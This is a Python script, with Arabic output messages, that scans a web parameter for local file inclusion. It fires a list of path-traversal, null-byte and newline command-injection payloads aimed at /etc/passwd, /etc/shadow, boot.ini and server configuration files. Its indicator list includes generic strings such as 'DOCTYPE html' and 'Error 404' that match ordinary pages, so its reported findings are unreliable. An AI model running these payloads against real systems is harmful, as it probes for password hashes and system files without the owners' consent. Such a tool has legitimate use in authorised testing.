import requests
import time

def scan_lfi(url, param="file"):
    payloads = [
        "../../../../../../../../../../../../etc/hosts%00",
        "../../../../../../../../../../../../etc/hosts",
        "../../boot.ini",
        "/../../../../../../../../%2A",
        "../../../../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../etc/shadow%00",
        "../../../../../../../../../../../../etc/shadow",
        "/../../../../../../../../../../etc/passwd^^",
        "/../../../../../../../../../../etc/shadow^^",
        "/./././././././././././etc/passwd",
        "/./././././././././././etc/shadow",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
        "%00/etc/passwd%00",
        "%00/etc/shadow%00",
        "/../../../../../../../../../../../etc/passwd%00.jpg",
        "/../../../../../../../../../../../etc/passwd%00.html",
        "%25%5c..%25%5c..%25%5c..%25%5c..%00",
        "%0a/bin/cat%20/etc/passwd",
        "%0a/bin/cat%20/etc/shadow",
        "\\' /bin/cat /etc/passwd \\",
        "\\' /bin/cat /etc/shadow \\",
        "../../../../../../../../conf/server.xml",
        "../../../../../../../../bin/id|",
        "C:/inetpub/wwwroot/global.asa",
        "C:/boot.ini",
        "../../../../../../../../../../../../boot.ini%00",
        "../../../../../../../../../../../../boot.ini",
        ".\\./.\\./.\\./.\\./.\\./boot.ini",
        "/..%c0%af../..%c0%af../..%c0%af../boot.ini",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"
    ]

    indicators = [
    "root:x:0:",  
    "root:",  
    "[boot loader]",  
    "Fatal error",  
    "failed to open stream",  
    "No such file or directory",
    "127.0.0.1",  
    "server at",  
    "DOCTYPE html",  
    "configuration",
    "passwd:",
    "shadow:",
    "boot loader",
    "db_username",
    "db_password",
    "administrator",
    "sql:",
    "path=",
    "global.asa",
    "xampp",
    "<dir>",
    "include_path",
    "DOCUMENT_ROOT",
    "phpadmin",
    "xmlns",
    "<database>",
    "Apache Server",
    "nginx configuration",
    "file not found",
    "Microsoft",
    "Error 404",
    "403 Forbidden"
]


    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            start_time = time.time()
            response = requests.get(target_url, headers=headers)
            response_time = time.time() - start_time

            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    print(f"[+] تم اكتشاف ثغرة LFI عند: {target_url} - المؤشر: {indicator}")
                    print(f"وقت الاستجابة: {response_time:.2f} ثانية")
                    break
            else:
                print(f"[-] لم يتم اكتشاف ثغرة LFI عند: {target_url}")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")
